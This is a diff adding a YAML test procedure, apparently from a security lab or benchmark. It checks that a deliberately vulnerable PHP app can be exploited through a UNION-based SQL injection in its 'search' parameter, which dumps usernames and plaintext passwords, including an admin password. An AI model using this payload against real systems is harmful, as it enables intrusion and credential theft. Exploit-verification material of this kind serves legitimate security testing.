@@ -1,0 +1,38 @@
+procedure:
+- action:
+    body: null
+    headers: {}
+    method: GET
+    type: http_request
+    url: http://${target_host}:${target_port}/index.php
+  expect:
+    status: 200
+  outputs: {}
+  session: null
+  step_id: verify_app_running
+  timeout: 10
+- action:
+    body: null
+    headers: {}
+    method: GET
+    type: http_request
+    url: http://${target_host}:${target_port}/index.php?search=x%27+UNION+SELECT+username%2Cpassword+FROM+users--+-
+  expect:
+    body_contains: S3cur3P@ssw0rd
+  outputs: {}
+  session: null
+  step_id: exploit_sqli_union
+  timeout: 10
+- action:
+    body: null
+    headers: {}
+    method: GET
+    type: http_request
+    url: http://${target_host}:${target_port}/index.php?search=x%27+UNION+SELECT+username%2Cpassword+FROM+users--+-
+  expect:
+    body_regex: <td>admin</td><td>S3cur3P@ssw0rd</td>
+  outputs: {}
+  session: null
+  step_id: verify_admin_credentials
+  timeout: 10
+sessions: []
